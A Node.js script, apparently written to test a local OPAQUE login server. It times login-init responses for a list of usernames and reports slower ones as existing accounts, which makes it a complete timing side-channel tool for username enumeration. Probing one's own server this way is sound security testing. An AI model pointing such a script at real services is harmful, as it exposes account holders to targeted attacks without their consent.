// timing_attack.js - The Side-Channel Spy
import fs from 'fs';
import path from 'path';
import fetch from 'node-fetch'; 

// --- FIX 1: DIRECT IMPORT (Bypasses Package Error) ---
import init, { Login } from './node_modules/@47ng/opaque-client/opaque-client.js';

const TARGET_URL = 'http://localhost:3000';

const USER_LIST = [
    'admin',       // Does not exist
    'root',        // Does not exist
    'support',     // Does not exist
    'abdul',       // <--- EXISTS (We expect this to be slower)
    'ghost',       // Does not exist
    'test',        // Does not exist
    'zainab'
];

// --- HELPERS ---
const binToJson = (u8) => Array.from(u8);

// --- FIX 2: LOAD WASM MANUALLY ---
let wasmInitialized = false;
async function loadWasm() {
    if (wasmInitialized) return;
    try {
        const wasmPath = path.resolve('./node_modules/@47ng/opaque-client/opaque-client_bg.wasm');
        const wasmBuffer = fs.readFileSync(wasmPath);
        await init(wasmBuffer);
        wasmInitialized = true;
    } catch (e) {
        console.error("CRITICAL: Could not load WASM file.", e);
        process.exit(1);
    }
}

async function measureTime(username) {
    // Ensure WASM is loaded before we use the Login class
    await loadWasm();

    // Generate a dummy request 
    const login = new Login();
    const request = login.start("dummy_password");

    const start = performance.now(); // Start Timer

    try {
        await fetch(`${TARGET_URL}/login-init`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                userId: username, 
                startUploadArray: binToJson(request) 
            })
        });
    } catch (e) {
        // Ignore errors, we only care about time
    }

    const end = performance.now(); // Stop Timer
    
    login.free();
    return end - start;
}

async function runAttack() {
    // Initialize once at the start
    await loadWasm();

    console.log(`\n=== TIMING ANALYSIS ATTACK ===\n`);
    console.log(`Measuring server response times...`);
    console.log(`-------------------------------------------`);

    const results = [];

    // Warm up the server (first request is always slow)
    await measureTime('warmup'); 

    // Run the check for each user
    for (const user of USER_LIST) {
        const time = await measureTime(user);
        results.push({ user, time });
        
        console.log(`User: ${user.padEnd(10)} | Response Time: ${time.toFixed(2)} ms`);
    }

    console.log(`-------------------------------------------`);
    
    // Analyze results
    // Calculate average time
    const avgTime = results.reduce((sum, r) => sum + r.time, 0) / results.length;
    
    console.log("\n[ANALYSIS]");
    results.forEach(r => {
        // If it takes significantly longer than average (e.g., +2ms is often enough locally)
        // OPAQUE math is heavy, so it should be visible.
        if (r.time > avgTime + 2.0) { 
            console.log(`🚨 TARGET FOUND: "${r.user}" exists! (Slow response detected)`);
        } else {
            console.log(`-  "${r.user}" likely does not exist (Fast rejection)`);
        }
    });
}

runAttack();